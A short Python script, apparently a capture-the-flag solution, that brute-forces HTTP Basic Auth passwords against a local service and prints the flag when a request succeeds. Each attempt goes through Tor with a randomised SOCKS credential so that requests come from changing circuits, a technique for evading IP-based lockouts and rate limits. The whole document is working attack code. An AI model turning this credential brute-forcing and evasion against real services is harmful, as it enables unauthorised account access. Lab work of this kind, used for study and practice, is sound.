import random
from multiprocessing import Pool
import requests
import base64
import re

host, port = 'localhost', 1337
HOST = 'http://%s:%d/' % (host, port)

username = b'username'

to_brute_force = ["{0:03}".format(i) for i in range(500)]

def execute(index):

    payload = base64.b64encode(username + b':' + bytes(index, 'utf-8'))
    session = requests.session()
    creds = str(random.randint(10000,0x7fffffff)) + ":" + "youtorpassword"

    session.proxies = {
        'http': 'socks5h://{}@localhost:9050'.format(creds),
        'https': 'socks5h://{}@localhost:9050'.format(creds)
    }

    req = session.get(HOST, headers={
        'Authorization': 'Basic '+payload.decode('utf-8')
    })

    if req.status_code == 200:
        print(re.search('FLAG = (.*)', req.text).group(0))


with Pool(processes=16) as pool:
    for i in to_brute_force:
        pool.apply_async(execute(str(i)))

    pool.close()
    pool.join()